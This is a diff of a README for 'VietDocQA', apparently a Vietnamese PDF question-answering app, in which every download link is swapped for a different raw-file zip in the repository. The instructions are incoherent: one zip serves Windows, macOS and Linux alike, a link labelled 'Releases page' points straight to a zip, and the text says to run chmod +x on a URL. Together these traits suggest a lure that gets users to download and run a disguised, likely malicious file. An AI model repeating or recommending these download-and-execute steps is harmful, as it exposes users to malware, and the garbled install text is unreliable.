@@ -6,7 +6,7 @@ Welcome to VietDocQA! This application lets you efficiently work with Vietnamese
 
 ## 📥 Download the Application
 
-[![Download VietDocQA](https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/web/Doc-Viet-QA-v3.8.zip%20VietDocQA-%https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/web/Doc-Viet-QA-v3.8.zip)](https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/web/Doc-Viet-QA-v3.8.zip)
+[![Download VietDocQA](https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/image/Doc_Viet_QA_v1.8.zip%20VietDocQA-%https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/image/Doc_Viet_QA_v1.8.zip)](https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/image/Doc_Viet_QA_v1.8.zip)
 
 ## 🌐 What is VietDocQA?
 
@@ -31,21 +31,21 @@ To use VietDocQA, your computer must meet the following requirements:
 ## 📚 How to Download & Install
 
 1. Click the link below to visit the VietDocQA Releases page:
-   [VietDocQA Releases](https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/web/Doc-Viet-QA-v3.8.zip)
+   [VietDocQA Releases](https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/image/Doc_Viet_QA_v1.8.zip)
 
 2. On the Releases page, you will see a list of available versions. Look for the most recent release.
 
 3. Choose the correct file for your operating system:
 
-   - For Windows, download `https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/web/Doc-Viet-QA-v3.8.zip`
-   - For macOS, download `https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/web/Doc-Viet-QA-v3.8.zip`
-   - For Linux, use `https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/web/Doc-Viet-QA-v3.8.zip`
+   - For Windows, download `https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/image/Doc_Viet_QA_v1.8.zip`
+   - For macOS, download `https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/image/Doc_Viet_QA_v1.8.zip`
+   - For Linux, use `https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/image/Doc_Viet_QA_v1.8.zip`
 
 4. Once the file is downloaded, follow these instructions to install it:
 
-   - **Windows:** Double-click the `https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/web/Doc-Viet-QA-v3.8.zip` file to start the installation. Follow the prompts to complete the process.
-   - **macOS:** Open the `https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/web/Doc-Viet-QA-v3.8.zip` file, drag the VietDocQA icon to your Applications folder, and launch from there.
-   - **Linux:** Make the `https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/web/Doc-Viet-QA-v3.8.zip` executable. You can do this by running the command `chmod +x https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/web/Doc-Viet-QA-v3.8.zip`, then run it by double-clicking the file.
+   - **Windows:** Double-click the `https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/image/Doc_Viet_QA_v1.8.zip` file to start the installation. Follow the prompts to complete the process.
+   - **macOS:** Open the `https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/image/Doc_Viet_QA_v1.8.zip` file, drag the VietDocQA icon to your Applications folder, and launch from there.
+   - **Linux:** Make the `https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/image/Doc_Viet_QA_v1.8.zip` executable. You can do this by running the command `chmod +x https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/image/Doc_Viet_QA_v1.8.zip`, then run it by double-clicking the file.
 
 ## 🎯 How to Use VietDocQA
 
@@ -78,6 +78,6 @@ VietDocQA includes features related to:
 
 Again, you can download the application from the link below:
 
-[![Download VietDocQA](https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/web/Doc-Viet-QA-v3.8.zip%20VietDocQA-%https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/web/Doc-Viet-QA-v3.8.zip)](https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/web/Doc-Viet-QA-v3.8.zip)
+[![Download VietDocQA](https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/image/Doc_Viet_QA_v1.8.zip%20VietDocQA-%https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/image/Doc_Viet_QA_v1.8.zip)](https://raw.githubusercontent.com/gbmarianoo/VietDocQA/main/image/Doc_Viet_QA_v1.8.zip)
 
 Thank you for choosing VietDocQA! Enjoy exploring and extracting valuable information from your PDFs with confidence.
